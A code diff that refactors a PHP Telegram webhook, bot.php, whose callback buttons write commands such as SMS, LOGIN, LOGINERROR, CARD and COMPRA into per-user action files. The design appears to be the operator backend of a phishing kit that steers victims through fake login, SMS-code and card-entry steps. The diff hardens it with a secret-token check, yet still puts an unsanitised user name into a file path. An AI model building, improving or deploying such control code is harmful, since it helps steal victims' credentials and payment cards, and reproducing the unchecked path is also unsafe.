@@ -1,65 +1,48 @@
 <?php
-// ===== bot.php =====
+// ===== bot.php — Webhook receiver de Telegram =====
 include("settings.php");
 
-$content = file_get_contents("php://input");
-$update = json_decode($content, true);
+// Verificar que el request viene de Telegram
+$secret_header = $_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN'] ?? '';
+if ($secret_header !== $webhook_secret) {
+    http_response_code(403);
+    exit('Forbidden');
+}
+
+$update = json_decode(file_get_contents("php://input"), true);
 
 if (isset($update['callback_query'])) {
-    $data = $update['callback_query']['data']; // Ej: "SMS|usuario123"
-    $chat_id = $update['callback_query']['message']['chat']['id'];
-    $callback_id = $update['callback_query']['id'];
+    $cb_id   = $update['callback_query']['id'];
+    $data    = $update['callback_query']['data']; // Ej: "SMS|usuario123"
 
     if (strpos($data, '|') !== false) {
-        list($comando, $usuario) = explode('|', $data);
+        list($comando, $usuario) = explode('|', $data, 2);
 
-        if (!file_exists("acciones")) {
-            mkdir("acciones", 0777, true);
-        }
+        if (!file_exists("acciones")) mkdir("acciones", 0755, true);
 
         $archivo = "acciones/$usuario.txt";
 
-        switch ($comando) {
-            case "SMS":
-                file_put_contents($archivo, "/SMS");
-                break;
-            case "SMSERROR":
-                file_put_contents($archivo, "/SMSERROR");
-                break;
-            case "NUMERO":
-                file_put_contents($archivo, "/NUMERO");
-                break;
-            case "ERROR":
-                file_put_contents($archivo, "/ERROR");
-                break;
-            case "LOGIN":
-                file_put_contents($archivo, "/LOGIN");
-                break;
-            case "LOGINERROR":
-                file_put_contents($archivo, "/LOGINERROR");
-                break;
-            case "CARD":
-                file_put_contents($archivo, "/CARD");
-                break;
-            case "LISTO":
-                file_put_contents($archivo, "/LISTO");
-                break;
-            case "MAIL":
-                file_put_contents($archivo, "/MAIL");
-                break;
-            case "COMPRA":
-                file_put_contents($archivo, "/COMPRA");
-                break;
-            default:
-                file_put_contents($archivo, "/ERROR");
-                break;
-        }
+        $map = [
+            'SMS'        => '/SMS',
+            'SMSERROR'   => '/SMSERROR',
+            'NUMERO'     => '/NUMERO',
+            'ERROR'      => '/ERROR',
+            'LOGIN'      => '/LOGIN',
+            'LOGINERROR' => '/LOGINERROR',
+            'CARD'       => '/CARD',
+            'LISTO'      => '/LISTO',
+            'MAIL'       => '/MAIL',
+            'COMPRA'     => '/COMPRA',
+        ];
+        file_put_contents($archivo, $map[$comando] ?? '/ERROR');
 
-        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
-            'callback_query_id' => $callback_id,
-            'text' => "✅ Acción enviada para $usuario",
-            'show_alert' => false
-        ]));
+        tg_request('answerCallbackQuery', [
+            'callback_query_id' => $cb_id,
+            'text'              => "✅ $comando → $usuario",
+            'show_alert'        => false,
+        ]);
     }
 }
-?>
+
+http_response_code(200);
+echo 'OK';
